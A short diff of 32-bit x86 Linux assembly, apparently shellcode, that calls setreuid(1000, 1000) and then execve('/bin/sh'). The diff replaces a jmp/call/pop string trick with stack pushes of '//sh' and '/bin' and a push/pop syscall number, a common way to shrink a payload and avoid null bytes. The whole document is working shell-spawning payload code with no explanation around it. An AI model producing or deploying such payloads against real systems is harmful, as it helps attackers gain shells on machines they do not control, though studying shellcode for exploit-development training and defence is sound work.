@@ -5,28 +5,23 @@ global _start
 _start:
 	
 	; setreuid(1000, 1000)
-
 	xor eax, eax
 	xor ebx, ebx
-	mov al, 70
 	mov bx, 1000
 	mov ecx, ebx
 	
+	push 0x46
+	pop eax ; SYS_setreuid
 	int 0x80 
 
-	jmp binsh
-
-	exec:
-	
 	; execve("/bin/sh", NULL, NULL)
-	
-	mov al, 11
 	xor ecx, ecx
 	xor edx, edx
-	pop ebx
+	
+	push edx
+	push 0x68732f2f ; //sh
+	push 0x6e69622f ; /bin
+	mov ebx, esp
 
+	mov al, 0xb
 	int 0x80
-
-	binsh:
-		call exec
-		db "/bin/sh"
